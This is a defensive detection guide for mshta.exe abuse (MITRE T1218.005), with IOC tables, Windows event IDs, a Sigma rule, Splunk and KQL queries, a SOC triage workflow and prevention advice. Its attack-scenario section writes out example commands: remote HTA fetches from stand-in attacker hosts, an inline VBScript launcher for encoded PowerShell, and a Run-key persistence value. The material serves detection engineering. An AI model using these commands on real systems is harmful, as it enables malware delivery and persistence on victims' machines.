# HTA File Detection Guide
## Detecting mshta.exe Abuse for Malware Delivery and Persistence

**MITRE ATT&CK:** T1218.005 — System Binary Proxy Execution: Mshta  
**Tactic:** Defense Evasion  
**Author:** Solomon James  
**Last Updated:** June 2026

---

## What is HTA?

HTA (HTML Application) files are Microsoft's executable HTML format, run by **mshta.exe** — a legitimate Windows binary located at `C:\Windows\System32\mshta.exe`. HTA files can execute VBScript and JScript with full system access, bypassing browser security sandboxes entirely.

Attackers abuse mshta.exe because:
- It is a **signed, trusted Microsoft binary** (LOLBin — Living Off the Land Binary)
- It can **download and execute remote payloads** in one command
- It **bypasses application whitelisting** that only blocks unsigned executables
- Many security tools do not flag mshta.exe by default
- It leaves **minimal disk artifacts** when executing remote content

---

## Attack Chain Overview

```
Phishing Email
    └── Malicious .hta attachment or link
            └── User opens / mshta.exe executes
                    └── VBScript/JScript runs
                            ├── Downloads second-stage payload
                            ├── Spawns cmd.exe / powershell.exe
                            ├── Modifies registry for persistence
                            └── Executes shellcode or drops malware
```

---

## Key Indicators of Compromise

### Suspicious mshta.exe Execution Patterns

| Pattern | Why It's Suspicious |
|---|---|
| `mshta.exe http://` or `https://` | Fetching remote HTA — most legitimate use is local files |
| `mshta.exe vbscript:` | Inline script execution without a file |
| `mshta.exe javascript:` | Inline JS execution |
| mshta.exe spawned by Office apps | Word/Excel/Outlook should never launch mshta |
| mshta.exe spawned by `wscript.exe` / `cscript.exe` | Script-to-HTA chain is a classic delivery method |
| mshta.exe in `%TEMP%`, `%APPDATA%`, Downloads | Legitimate HTA files live in fixed app directories |
| mshta.exe with no command-line arguments | Possible process hollowing |

### Suspicious Child Processes of mshta.exe

Any of these spawned by mshta.exe is high-confidence malicious:

- `cmd.exe`
- `powershell.exe`
- `wscript.exe`
- `cscript.exe`
- `regsvr32.exe`
- `rundll32.exe`
- `schtasks.exe`
- `net.exe` / `net1.exe`
- `certutil.exe`
- `bitsadmin.exe`

---

## Windows Event IDs to Monitor

| Event ID | Log | What It Shows |
|---|---|---|
| **4688** | Security | Process creation — mshta.exe launch + full command line |
| **1** | Sysmon | Process creation with hashes, parent process, full cmdline |
| **3** | Sysmon | Network connection — mshta.exe making outbound HTTP/S |
| **11** | Sysmon | FileCreate — HTA file dropped to disk |
| **13** | Sysmon | Registry modification — persistence via Run keys |
| **7** | Sysmon | Image loaded — DLLs loaded by mshta.exe |

> **Prerequisite:** Event ID 4688 requires "Audit Process Creation" enabled AND "Include command line in process creation events" enabled via Group Policy. Without Sysmon, command-line visibility is limited.

---

## Real-World Attack Scenarios

### Scenario 1 — Phishing with Remote HTA
```
User receives: "Invoice_June2026.hta"
Execution:     mshta.exe http://malicious-domain.com/payload.hta
Result:        Remote VBScript downloads and runs Cobalt Strike beacon
```

### Scenario 2 — Inline VBScript Execution
```
Command:  mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc [base64]"":close")
Result:   Base64-encoded PowerShell runs entirely in memory — no file dropped
```

### Scenario 3 — Office Macro → mshta Chain
```
User enables macros in Word doc
Macro runs:   Shell "mshta.exe http://attacker.com/stage2.hta"
Result:       HTA fetches and runs second-stage payload
Parent chain: winword.exe → mshta.exe → powershell.exe
```

### Scenario 4 — Persistence via Registry
```
mshta.exe writes to:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: mshta.exe http://attacker.com/persist.hta
Result: Malicious HTA executes on every user login
```

---

## Sigma Rule

```yaml
title: Suspicious mshta.exe Execution
id: a7f3c2e1-4b89-4d12-9f3a-c1e2d3f4a5b6
status: production
description: Detects mshta.exe executing remote content or spawning suspicious child processes
author: Solomon James
date: 2026/06/12
tags:
  - attack.defense_evasion
  - attack.t1218.005
logsource:
  category: process_creation
  product: windows
detection:
  selection_remote:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'vbscript:'
      - 'javascript:'
  selection_child:
    ParentImage|endswith: '\mshta.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
      - '\schtasks.exe'
      - '\certutil.exe'
  selection_office_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\outlook.exe'
      - '\powerpnt.exe'
    Image|endswith: '\mshta.exe'
  condition: selection_remote or selection_child or selection_office_parent
falsepositives:
  - Legacy enterprise applications using HTA for UI (rare)
  - Software installers using HTA wizard interfaces
level: high
```

---

## Splunk Detection Query

```spl
index=windows EventCode=1 Image="*\\mshta.exe"
| eval suspicious_cmdline=if(match(CommandLine, "(?i)(http://|https://|vbscript:|javascript:)"), "YES", "NO")
| eval suspicious_parent=if(match(ParentImage, "(?i)(winword|excel|outlook|powerpnt|wscript|cscript)"), "YES", "NO")
| where suspicious_cmdline="YES" OR suspicious_parent="YES"
| table _time, ComputerName, User, ParentImage, CommandLine, suspicious_cmdline, suspicious_parent
| sort -_time
```

---

## KQL Detection Query (Microsoft Sentinel)

```kql
DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://", "https://", "vbscript:", "javascript:")
    or InitiatingProcessFileName has_any ("winword.exe", "excel.exe", "outlook.exe", "powerpnt.exe", "wscript.exe", "cscript.exe")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| order by TimeGenerated desc
```

---

## False Positive Tuning

**Common legitimate uses of mshta.exe:**
- Old enterprise applications with HTA-based UI (Help files, configuration wizards)
- Software installers using HTA for setup dialogs
- Microsoft documentation tools (rare, diminishing)

**Tuning approach:**
1. Baseline mshta.exe executions in your environment for 7 days
2. Whitelist known-good parent processes and specific command-line patterns
3. Focus alerts on: remote URL execution, office app parents, suspicious child processes
4. Any mshta.exe making outbound network connections should be treated as high priority

---

## SOC Investigation Workflow

```
Alert: Suspicious mshta.exe execution
    │
    ├── 1. Capture full command line (Event ID 1 / Sysmon)
    │         └── Remote URL? → Threat intel lookup on domain/IP
    │
    ├── 2. Check parent process
    │         └── Office app? → Almost certainly malicious
    │
    ├── 3. Check child processes (next 60 seconds)
    │         └── PowerShell / cmd spawned? → Stage 2 payload likely running
    │
    ├── 4. Check network connections (Sysmon Event ID 3)
    │         └── mshta.exe connecting out? → C2 or payload download
    │
    ├── 5. Check registry modifications (Sysmon Event ID 13)
    │         └── Run key modified? → Persistence established
    │
    └── 6. Isolate host if any above confirmed
              └── Collect: memory dump, process tree, network logs
```

---

## Prevention Recommendations

- **Block mshta.exe via AppLocker / WDAC** if not required in your environment
- **Enable Attack Surface Reduction rule:** "Block execution of potentially obfuscated scripts" (ASR rule ID: 5BEB7EFE)
- **Enable ASR rule:** "Block Office applications from creating child processes"
- **Web proxy:** Block outbound HTTP/S from mshta.exe at the proxy layer
- **Email gateway:** Strip or sandbox .hta attachments before delivery
- **Endpoint detection:** Alert on any mshta.exe network connection

---

## Interview-Ready Answer

**Q: "How would you detect mshta.exe abuse in a SOC environment?"**

> "mshta.exe is a signed Windows binary that attackers abuse to execute VBScript or fetch remote payloads while bypassing application whitelisting — it's a classic LOLBin technique mapped to T1218.005. My detection approach covers three angles: first, I monitor process creation logs for mshta.exe command lines containing remote URLs, vbscript: or javascript: inline execution — that catches direct abuse. Second, I watch for mshta.exe spawned by Office applications like Word or Excel, since there's no legitimate reason for that parent-child relationship. Third, I alert on any suspicious child processes spawned by mshta.exe — particularly PowerShell, cmd, or certutil — since those indicate the HTA has already executed a second stage. For network visibility, Sysmon Event ID 3 catches outbound connections from mshta.exe, which can identify C2 or payload downloads. On the prevention side, if mshta.exe isn't needed in the environment, blocking it via AppLocker or WDAC eliminates the attack surface entirely."

---

*Part of the Detection-Content framework by Solomon James | github.com/Jaysolex/Detection-Content*
